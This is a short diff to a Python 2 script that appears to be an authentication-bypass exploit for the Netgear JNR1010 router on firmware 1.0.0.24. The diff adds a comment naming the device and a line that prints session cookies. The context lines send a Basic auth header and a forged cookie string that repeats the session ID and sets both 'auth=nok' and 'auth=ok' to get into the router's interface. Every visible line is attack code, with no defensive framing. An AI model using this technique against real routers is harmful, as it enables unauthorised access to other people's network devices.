@@ -1,3 +1,4 @@
+#Device: Netgear JNR1010 Firmware: 1.0.0.24
 import requests
 import sys
 import base64
@@ -40,3 +41,4 @@ with requests.Session() as s:
 	headers = {'Authorization' : 'Basic ' + encookie.rstrip('\n')}
 	cookies = {'Cookie' : 'sessionid=' + SessionID + '; auth=nok; expires=Sun, 15-May-2112 01:45:46 GMT; sessionid=' + SessionID + '; auth=ok; expires=Mon, 31-Jan-2112 16:00:00 GMT'}
 	res = s.get(URL, headers=headers, cookies=cookies, proxies=proxies)
+	print s.cookies.get_dict()
